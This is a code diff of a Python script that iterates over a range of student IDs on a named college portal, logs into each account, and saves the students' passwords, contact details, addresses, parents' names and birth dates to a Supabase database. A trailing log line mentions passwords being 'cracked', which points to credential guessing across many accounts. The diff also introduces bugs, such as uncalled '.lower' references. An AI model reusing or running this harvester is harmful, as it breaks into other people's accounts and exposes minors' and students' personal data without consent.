@@ -1,4 +1,5 @@
 from FirebaseStudentDatabase import *
+from SupabaseStudentDatabase import *
 from modules.requests_module import *
 import time
 
@@ -9,7 +10,7 @@ def getStudentDataFromSaksham(userid, password):
     return student
 
 def main():
-        db = FirebaseStudentDatabase()
+        db = SupabaseStudentDatabase()
         
         for i in range(1200, 1300):
                 
@@ -41,7 +42,7 @@ def main():
                             "enrollmentNo":None,
                             "admissionDate":None,
                             "studentType":None,
-                            "timeTake":elapsedTime
+                            "timeTaken":None
                             }
                     db.addStudentData(userid, data = working_dict)
                     
@@ -68,7 +69,7 @@ def main():
                             "enrollmentNo":None,
                             "admissionDate":None,
                             "studentType":None,
-                            "timeTake":elapsedTime
+                            "timeTaken":elapsedTime
                             }
                         db.addStudentData(userid, null_dict)
                         
@@ -78,19 +79,19 @@ def main():
                         student_dict = {
                             "password":password,
                             "timeTaken":elapsedTime,
-                            "studentName":student.name,
+                            "studentName":student.name.lower,
                             "phone":student.contact_no,
                             "category":student.category,
                             "email":student.email,
                             "roll":student.roll_no, 
                             "address":student.address,
-                            "fatherName":student.father_name,
-                            "motherName":student.mother_name,
+                            "fatherName":student.father_name.lower,
+                            "motherName":student.mother_name.lower,
                             "dob":student.dob,
                             "gender":student.gender,
                             "studentId":student.student_id,
                             "session":student.session,
-                            "enrollmentNo.":student.enrollment_no,
+                            "enrollmentNo":student.enrollment_no,
                             "admissionDate":student.admission_date,
                             "studentType":student.student_type,
                             }
@@ -101,5 +102,9 @@ def main():
                     
                 
     
-    
 main()
+
+
+# Started for user: 2023/1200
+# Password not found in database neither being cracked
+# Error: HTTPSConnectionPool(host='saksham.sitslive.com', port=443): Max retries exceeded with url: /login (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x000001271EF9B320>, 'Connection to saksham.sitslive.com timed out. (connect timeout=None)'))
